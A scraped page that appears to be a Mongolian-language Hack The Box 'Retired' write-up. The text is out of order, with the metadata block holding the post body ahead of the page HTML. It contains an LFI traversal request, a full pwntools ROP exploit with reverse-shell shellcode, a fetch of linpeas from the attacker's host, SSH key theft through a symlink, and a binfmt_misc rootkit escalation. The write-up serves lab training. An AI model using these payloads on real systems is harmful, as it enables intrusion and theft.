scsi_eh_4 165 1354.364173 26 120 0.000000 0.594965 0.000000 0 0 / S scsi_eh_5 167 1354.265520 26 120 0.000000 0.378000 0.000000 0 0 / S scsi_eh_6 169 1354.359390 26 120 0.000000 0.474015 0.000000 0 0 / S scsi_eh_8 173 1354.266204 26 120 0.000000 0.299895 0.000000 0 0 / S scsi_eh_11 179 1354.319499 26 120 0.000000 0.347599 0.000000 0 0 / S scsi_eh_12 181 1354.294967 26 120 0.000000 0.327516 0.000000 0 0 / S scsi_eh_13 183 1354.305362 26 120 0.000000 0.333553 0.000000 0 0 / S scsi_eh_14 185 1354.313890 26 120 0.000000 0.297549 0.000000 0 0 / S scsi_eh_19 195 1354.365835 26 120 0.000000 0.338002 0.000000 0 0 / S scsi_eh_21 199 1354.259069 26 120 0.000000 0.231276 0.000000 0 0 / S scsi_eh_22 201 1354.287901 26 120 0.000000 0.261962 0.000000 0 0 / S scsi_eh_24 205 1354.357431 26 120 0.000000 0.329507 0.000000 0 0 / S scsi_eh_28 213 1354.362151 26 120 0.000000 0.334969 0.000000 0 0 / I scsi_tmf_31 220 1326.966833 2 100 0.000000 0.016151 0.000000 0 0 / S jbd2/sda1-8 281 468587.491477 46702 120 0.000000 2213.353470 0.000000 0 0 / S systemd-journal 332 468570.029689 74993 120 0.000000 11469.204517 0.000000 0 0 / S VGAuthService 388 3672.933937 102 120 0.000000 24.317929 0.000000 0 0 / S vmtoolsd 389 468591.640059 974905 120 0.000000 75748.585991 0.000000 0 0 / S HangDetector 478 468589.235347 84811 120 0.000000 3271.888116 0.000000 0 0 / I cryptd 394 1821.306494 2 100 0.000000 0.025498 0.000000 0 0 / S irq/16-vmwgfx 398 0.000000 315126 49 0.000000 6109.678753 0.000000 0 0 / I ttm_swap 404 1846.587609 2 100 0.000000 0.005039 0.000000 0 0 / S card0-crtc0 405 0.000000 2 49 0.000000 0.003597 0.000000 0 0 / S card0-crtc1 406 0.000000 2 49 0.000000 0.003386 0.000000 0 0 / S card0-crtc2 407 0.000000 2 49 0.000000 0.003096 0.000000 0 0 / S card0-crtc3 408 0.000000 2 49 0.000000 0.002765 0.000000 0 0 / S card0-crtc4 409 0.000000 2 49 0.000000 0.002965 0.000000 0 0 / S card0-crtc5 410 0.000000 2 49 0.000000 0.002695 0.000000 0 0 / S card0-crtc6 411 0.000000 2 49 0.000000 0.002484 0.000000 0 0 / S card0-crtc7 412 0.000000 2 49 0.000000 0.002435 0.000000 0 0 / S rsyslogd 423 468436.598541 176 120 0.000000 15.178844 0.000000 0 0 / S in:imuxsock 438 468569.565158 41729 120 0.000000 1456.008380 0.000000 0 0 / S in:imklog 439 459624.836862 16 120 0.000000 3.803078 0.000000 0 0 / S rs:main Q:Reg 440 468569.559458 41671 120 0.000000 1326.234113 0.000000 0 0 / S nginx 541 425815.900707 5 120 0.000000 0.860043 0.000000 0 0 / S nginx 543 465475.646747 616996 120 0.000000 141323.361247 0.000000 0 0 / S sshd 31241 410461.163963 32 120 0.000000 32.728368 0.000000 0 0 / S sshd 31249 468578.986207 464 120 0.000000 56.943783 0.000000 0 0 / S bash 31250 413038.940766 89 120 0.000000 34.014433 0.000000 0 0 / I kworker/u4:3 35630 468153.297932 550 120 0.000000 29.587530 0.000000 0 0 / I kworker/1:0 35699 468595.964356 33275 120 0.000000 1341.618264 0.000000 0 0 / I kworker/1:2 35985 468359.826004 15 120 0.000000 0.156181 0.000000 0 0 / activate_licens\nS task PID tree-key switches prio wait-time sum-exec sum-sleep ------------------------------------------------------------------------------------------------------------- activate_licens 418 446273.871782 30 120 0.000000 9.136912 0.000000 0 0 / PID -\u003e 418\nGET /index.php?page=../../../../../../../../../../proc/418/exe HTTP/1.1 Host: 10.10.11.154 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 burp-s save file —Ö–∏–π–Ω—ç.\n6. Buffer Overflow burp-s save —Ö–∏–π—Å—ç–Ω —Ñ–∞–π–ª–∞–∞ binary –Ω—ç—Ä—Ç—ç–π –±–æ–ª–≥–æ–æ–¥ execute —Ö–∏–π–∂ “Ø–∑—ç–≤:\nchmod +x binary ./binary 1337 [+] starting server listening on port 1337 [+] listening .. #!/usr/bin/env python3 from pwn import * r = remote(\"127.0.0.1\", 1337) gdb.attach(r) # debug in gdb (No debugging symbols found in /lib/x86_64-linux-gnu/libsqlite3.so.0) Reading symbols from /lib/x86_64-linux-gnu/libc.so.6... Reading symbols from /usr/lib/debug/.build-id/54/eef5ce96cf37cb175b0d93186836ca1caf470c.debug... Reading symbols from /lib/x86_64-linux-gnu/libm.so.6... Reading symbols from /usr/lib/debug/.build-id/e9/d2c06479b13dd3cfa78d714d11dccf6fcbee51.debug... Reading symbols from /lib/x86_64-linux-gnu/libpthread.so.0... Reading symbols from /usr/lib/debug/.build-id/50/18237bbf012b4094027fd0b96fc22a24496ea4.debug... [Thread debugging using libthread_db enabled] Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\". Reading symbols from /lib/x86_64-linux-gnu/libdl.so.2... Reading symbols from /usr/lib/debug/.build-id/11/8b90161526d181807818c459baee841993795b.debug... Reading symbols from /lib64/ld-linux-x86-64.so.2... Reading symbols from /usr/lib/debug/.build-id/32/438eb3b034da54caf58c7a65446639f7cfe274.debug... --Type for more, q to quit, c to continue without paging--c 0x00007f17a957de8e in __GI___libc_read (fd=4, buf=0x7ffc84813adc, nbytes=4) at ../sysdeps/unix/sysv/linux/read.c:26 26 ../sysdeps/unix/sysv/linux/read.c: No such file or directory. (gdb) Script.py nc -vlnp 9001 local ip -—Ç–∞–π –∞–∂–∏–ª—É—É–ª–ª–≤–∞–ª netcat\nnc -vlnp 9001 python script\npython3 script.py 10.10.14.58 9001 #!/usr/bin/env python from pwn import * import sys,re,requests,socket IP=\"10.10.11.154\" def usage(): print(f\"Usage: {sys.argv[0]} \") exit() # download file and save to /tmp def get_file(path): r = requests.get(f\"http://{IP}/index.php?page={path}\", allow_redirects=False) lpath = f\"/tmp/{path.split('/')[-1]}\" with open(lpath,\"wb\") as f: f.write(r.content) return lpath # find process id def get_pid(): r = requests.get(f\"http://{IP}/index.php?page=/proc/sched_debug\", allow_redirects=False) pid = re.search(\"activate_licens\\s+([0-9]+)\",r.text).group(1) print(f\"[+] activate_license running @ PID {pid}\") return pid # extract base addresses from /proc/PID/maps def get_addresses(pid):¬†r = requests.get(f\"http://{IP}/index.php?page=/proc/{pid}/maps\", allow_redirects=False) libc_base = int(re.search(\"^.*libc.*$\", r.text, re.M).group(0).split(\"-\")[0], 16) libc_path = re.search(\"^.*libc.*$\", r.text, re.M).group(0).split(\" \")[-1] libsqlite_base = int(re.search(\"^.*libsqlite.*$\", r.text, re.M).group(0).split(\"-\")[0], 16) libsqlite_path = re.search(\"^.*libsqlite.*$\", r.text, re.M).group(0).split(\" \")[-1] stack_base = int(re.search(\"^.*\\[stack\\].*$\", r.text, re.M).group(0).split(\"-\")[0], 16) stack_end = int(re.search(\"^.*\\[stack\\].*$\", r.text, re.M).group(0).split(\"-\")[1].split()[0], 16) return libc_base, libc_path,libsqlite_base, libsqlite_path, stack_base, stack_end def main(): if len(sys.argv) \u003c 3: usage() try: ip = socket.inet_aton(sys.argv[1]) port =¬†port=struct.pack(\"\u003eH\",int(sys.argv[2])) except: print(f\"[-] Invalid arguments\") usage() # Shellcode¬†msfvenom -p linux/x64/shell_reverse_tcp LHOST=ip LPORT=port -f py shellcode =¬†b\"\" shellcode += b\"\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\" shellcode += b\"\\x97\\x48\\xb9\\x02\\x00\"¬†+ port¬†+¬†ip +¬†b\"\\x51\\x48\" shellcode += b\"\\x89\\xe6\\x6a\\x10\\x5a\\x6a\\x2a\\x58\\x0f\\x05\\x6a\\x03\\x5e\" shellcode += b\"\\x48\\xff\\xce\\x6a\\x21\\x58\\x0f\\x05\\x75\\xf6\\x6a\\x3b\\x58\" shellcode += b\"\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x53\\x48\" shellcode += b\"\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\" # search PID with LFI pid = get_pid() if not pid: print(f\"[-] Could not find PID for activate_license\") exit()¬†# search addresses in /proc/PID/maps libc_base, libc_path, libsqlite_base, libsqlite_path, stack_base, stack_end = get_addresses(pid)¬†# calc sizeof(stack) for mprotect¬†stack_size = stack_end - stack_base¬†# 0x21000¬†context.clear(arch='amd64') libc = ELF(get_file(libc_path),checksec=False)¬†# download libc libc.address = libc_base libsql = ELF(get_file(libsqlite_path),checksec=False)¬†# download libsqlite libsql.address = libsqlite_base rop = ROP([libc, libsql]) offset = 520 # search ROP Gadgets¬†mprotect = libc.symbols['mprotect']¬†# 0xf8c20¬†readelf -s libc.so.6 | grep mprotect pop_rdi = rop.rdi[0]¬†# 0x26796¬†ropper -f libc.so.6 --search \"pop rdi\" pop_rsi = rop.rsi[0]¬†# 0x2890f¬†ropper -f libc.so.6 --search \"pop rsi\" pop_rdx = rop.rdx[0]¬†# 0xcb1cd¬†ropper -f libc.so.6 --search \"pop rdx\" jmp_rsp = rop.jmp_rsp[0]¬†# 0xd431d¬†ropper -f libsqlite3.so.0.8.6 --search \"jmp rsp\" payload = b'A' * offset #int mprotect(void *addr, size_t len, int prot); payload += p64(pop_rdi) + p64(stack_base)¬†# addr = Begin of Stack payload += p64(pop_rsi) + p64(stack_size)¬†# len = size of Stack payload += p64(pop_rdx) + p64(7)¬†# prot = Permission 7 -\u003e rwx payload += p64(mprotect)¬†# call mprotect payload += p64(jmp_rsp)¬†# jmp rsp payload += shellcode¬†# add shellcode # File Upload beta.html r = requests.post(f\"http://{IP}/activate_license.php\", files = { \"licensefile\": payload } )¬†if __name__ == \"__main__\": main() shell balance:\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")' export TERM=xterm wget http://10.10.14.58:8000/linpeas.sh chmod +x linpeas.sh var/www/html –¥–æ—Ç–æ—Ä symlink “Ø“Ø—Å–≥—ç—ç–¥\nln -s /home/dev/.ssh/id_rsa /var/www/html “Ø“Ø—Å—Å—ç–Ω —Å“Ø“Ø–ª–∏–π–Ω backup —Ñ–∞–π–ª-–≥ tmp –¥–æ—Ç–æ—Ä unzip —Ö–∏–π–≥—ç—ç–¥ —Ö–∞—Ä–≤–∞–ª id_rsa –±–∞–π–≥–∞–∞.\n# Machine VM python3 -m http.server 900 # Local VM wget 10.10.11.154:9001/id_rsa chmod 600 id_rsa sh -i id_rsa dev@10.10.11.154 user.txt\n3ff5b1******* 7. Privilege escalation cd /proc/sys/fs/binfmt_misc dev@retired:/proc/sys/fs/binfmt_misc$ ls -lha total 0 drwxr-xr-x 2 root root 0 Jul 10 21:40 . dr-xr-xr-x 1 root root 0 Jul 10 21:40 .. -rw-r--r-- 1 root root 0 Jul 10 21:40 EMUEMU --w------- 1 root root 0 Jul 10 21:40 register -rw-r--r-- 1 root root 0 Jul 10 21:40 status EMUEMU\nenabled interpreter /usr/bin/emuemu flags: offset 0 magic 13374f53545249434800524f4d00 Status\ndev@retired:/proc/sys/fs/binfmt_misc$ cat status enabled binfmt_misc –ë—ç–ª—ç–Ω toolkit –∞—à–∏–≥–ª–∞—Ö:\ngit clone https://github.com/plcp/binfmt_misc cd binfmt_misc ./binfmt_rootkit --help Usage: ./binfmt_rootkit Gives you a root shell if /proc/sys/fs/binfmt_misc/register is writeable, note that it must be enforced by any other mean before your try this, for example by typing something like \"sudo chmod +6 /*/*/f*/*/*r\" while Dave is thinking that you are fixing his problem. not_writeable - –∫–æ–º–º–µ–Ω—Ç —Ö–∏–π–Ω—ç, register —Ä—É—É —Ö–∞–Ω–¥–∞–∂ –±–æ–ª–æ—Ö–≥“Ø–π –±–æ–ª–æ—Ö–æ–æ—Ä.\nbinfmt_line=\"_${fmtname}_M__${binfmt_magic}__${fmtinterpr}_OC\" echo \"$binfmt_line\" \u003e /tmp/temp.txt cat /tmp/temp.txt | /usr/lib/emuemu/reg_helper exec \"$target\" source\n#!/bin/bash readonly searchsuid=\"/bin/\" readonly mountpoint=\"/proc/sys/fs/binfmt_misc\" readonly exe=\"$0\" warn() { 1\u003e\u00262 echo $@ } die() { warn $@ exit -1 } usage() { cat 1\u003e\u00262 \u003c","wordCount":"4563","inLanguage":"mn","datePublished":"2024-03-11T00:00:00Z","dateModified":"2024-03-11T00:00:00Z","author":{"@type":"Person","name":"CaDiL"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://cadil.github.io/posts/2024-03-11-htb-retired-writeup/"},"publisher":{"@type":"Organization","name":"CaDiL's Blog","logo":{"@type":"ImageObject","url":"https://cadil.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://cadil.github.io/ accesskey=h title="CaDiL's Blog (Alt + H)">CaDiL's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://cadil.github.io/archives/ title=–ê—Ä—Ö–∏–≤><span>–ê—Ä—Ö–∏–≤</span></a></li><li><a href=https://cadil.github.io/search/ title=–•–∞–π–ª—Ç><span>–•–∞–π–ª—Ç</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://cadil.github.io/>–ù“Ø“Ø—Ä</a>&nbsp;¬ª&nbsp;<a href=https://cadil.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">HTB - Retired</h1><div class=post-description>HTB - Retired - Writeup /Mostly Notes/</div><div class=post-meta><span title='2024-03-11 00:00:00 +0000 UTC'>–≥—É—Ä–∞–≤–¥—É–≥–∞–∞—Ä —Å–∞—Ä 11, 2024</span>&nbsp;¬∑&nbsp;22 –ú–ò–ù&nbsp;¬∑&nbsp;CaDiL</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>–ê–≥—É—É–ª–≥–∞</span></summary><div class=inner><ul><li><a href=#1-ip-address aria-label="1. IP Address">1. IP Address</a></li><li><a href=#2-nmap--nikto aria-label="2. Nmap & Nikto">2. Nmap & Nikto</a></li><li><a href=#3-gobuster aria-label="3. Gobuster">3. Gobuster</a></li><li><a href=#4-feroxbuster aria-label="4. Feroxbuster">4. Feroxbuster</a></li><li><a href=#5-lfi aria-label="5. LFI">5. LFI</a></li><li><a href=#6-buffer-overflow aria-label="6. Buffer Overflow">6. Buffer Overflow</a></li><li><a href=#7-privilege-escalation aria-label="7. Privilege escalation">7. Privilege escalation</a></li></ul></div></details></div><div class=post-content><h3 id=1-ip-address>1. IP Address<a hidden class=anchor aria-hidden=true href=#1-ip-address>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Machine Address</span>
</span></span><span style=display:flex><span>10.10.11.154
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Local Address</span>
</span></span><span style=display:flex><span>10.10.14.121
</span></span></code></pre></div><h3 id=2-nmap--nikto>2. Nmap & Nikto<a hidden class=anchor aria-hidden=true href=#2-nmap--nikto>#</a></h3><p><strong>Nmap</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nmap -sV -sC -oA nmap/retired 10.10.11.154
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-04-10 05:47 EDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.154
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.24s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>998</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.4p1 Debian <span style=color:#ae81ff>5</span> <span style=color:#f92672>(</span>protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>3072</span> 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    nginx
</span></span><span style=display:flex><span>| http-title: Agency - Start Bootstrap Theme
</span></span><span style=display:flex><span>|_Requested resource was /index.php?page<span style=color:#f92672>=</span>default.html
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 54.80 seconds
</span></span></code></pre></div><p><strong>Nikto</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nikto -h 10.10.11.154
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>- Nikto v2.1.6
</span></span><span style=display:flex><span>---------------------------------------------------------------------------
</span></span><span style=display:flex><span>+ Target IP:          10.10.11.154
</span></span><span style=display:flex><span>+ Target Hostname:    10.10.11.154
</span></span><span style=display:flex><span>+ Target Port:        <span style=color:#ae81ff>80</span>
</span></span><span style=display:flex><span>+ Start Time:         2022-04-11 02:57:42 <span style=color:#f92672>(</span>GMT-4<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>---------------------------------------------------------------------------
</span></span><span style=display:flex><span>+ Server: nginx
</span></span><span style=display:flex><span>+ The anti-clickjacking X-Frame-Options header is not present.
</span></span><span style=display:flex><span>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span></span><span style=display:flex><span>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
</span></span><span style=display:flex><span>+ Root page / redirects to: /index.php?page<span style=color:#f92672>=</span>default.html
</span></span><span style=display:flex><span>+ No CGI Directories found <span style=color:#f92672>(</span>use <span style=color:#e6db74>&#39;-C all&#39;</span> to force check all possible dirs<span style=color:#f92672>)</span>                                             
</span></span></code></pre></div><h3 id=3-gobuster>3. Gobuster<a hidden class=anchor aria-hidden=true href=#3-gobuster>#</a></h3><p><strong>CLI</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gobuster dir -u http://10.10.11.154 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span></code></pre></div><p><strong>Result</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>Gobuster v3.1.0
</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:                     http://10.10.11.154
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:                  GET
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:                 <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Negative Status codes:   <span style=color:#ae81ff>404</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:              gobuster/3.1.0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:                 10s
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2022/04/11 03:01:50 Starting gobuster in directory enumeration mode
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>/assets               <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 162<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://10.10.11.154/assets/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/css                  <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 162<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://10.10.11.154/css/<span style=color:#f92672>]</span>   
</span></span><span style=display:flex><span>/js                   <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 162<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://10.10.11.154/js/<span style=color:#f92672>]</span>
</span></span></code></pre></div><p><code>-x php</code> –Ω—ç–º—ç—ç–¥ “Ø–∑–≤—ç–ª:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gobuster dir -u http://10.10.11.154/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x php
</span></span></code></pre></div><h3 id=4-feroxbuster>4. Feroxbuster<a hidden class=anchor aria-hidden=true href=#4-feroxbuster>#</a></h3><p><strong>CLI</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>feroxbuster -u http://10.10.11.154 -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
</span></span></code></pre></div><p><strong>Result</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>by Ben <span style=color:#e6db74>&#34;epi&#34;</span> Risher ü§ì                 ver: 2.3.3
</span></span><span style=display:flex><span>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
</span></span><span style=display:flex><span> üéØ  Target Url            ‚îÇ http://10.10.11.154
</span></span><span style=display:flex><span> üöÄ  Threads               ‚îÇ <span style=color:#ae81ff>50</span>
</span></span><span style=display:flex><span> üìñ  Wordlist              ‚îÇ /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
</span></span><span style=display:flex><span> üëå  Status Codes          ‚îÇ <span style=color:#f92672>[</span>200, 204, 301, 302, 307, 308, 401, 403, 405, 500<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span> üí•  Timeout <span style=color:#f92672>(</span>secs<span style=color:#f92672>)</span>        ‚îÇ <span style=color:#ae81ff>7</span>
</span></span><span style=display:flex><span> ü¶°  User-Agent            ‚îÇ feroxbuster/2.3.3
</span></span><span style=display:flex><span> üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
</span></span><span style=display:flex><span> üîÉ  Recursion Depth       ‚îÇ <span style=color:#ae81ff>4</span>
</span></span><span style=display:flex><span> üéâ  New Version Available ‚îÇ https://github.com/epi052/feroxbuster/releases/latest
</span></span><span style=display:flex><span>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
</span></span><span style=display:flex><span> üèÅ  Press <span style=color:#f92672>[</span>ENTER<span style=color:#f92672>]</span> to use the Scan Cancel Menu‚Ñ¢
</span></span><span style=display:flex><span>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
</span></span><span style=display:flex><span><span style=color:#ae81ff>301</span>        7l       11w      162c http://10.10.11.154/js
</span></span><span style=display:flex><span><span style=color:#ae81ff>301</span>        7l       11w      162c http://10.10.11.154/css
</span></span><span style=display:flex><span><span style=color:#ae81ff>301</span>        7l       11w      162c http://10.10.11.154/assets
</span></span><span style=display:flex><span><span style=color:#ae81ff>301</span>        7l       11w      162c http://10.10.11.154/assets/img
</span></span><span style=display:flex><span><span style=color:#ae81ff>301</span>        7l       11w      162c http://10.10.11.154/assets/img/about
</span></span><span style=display:flex><span><span style=color:#ae81ff>301</span>        7l       11w      162c http://10.10.11.154/assets/img/logos
</span></span><span style=display:flex><span><span style=color:#ae81ff>301</span>        7l       11w      162c http://10.10.11.154/assets/img/team
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>####################] - 2m    239992/239992  0s      found:7       errors:36     </span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>####################] - 2m     29999/29999   196/s   http://10.10.11.154</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>####################] - 2m     29999/29999   195/s   http://10.10.11.154/js</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>####################] - 2m     29999/29999   195/s   http://10.10.11.154/css</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>####################] - 2m     29999/29999   195/s   http://10.10.11.154/assets</span>
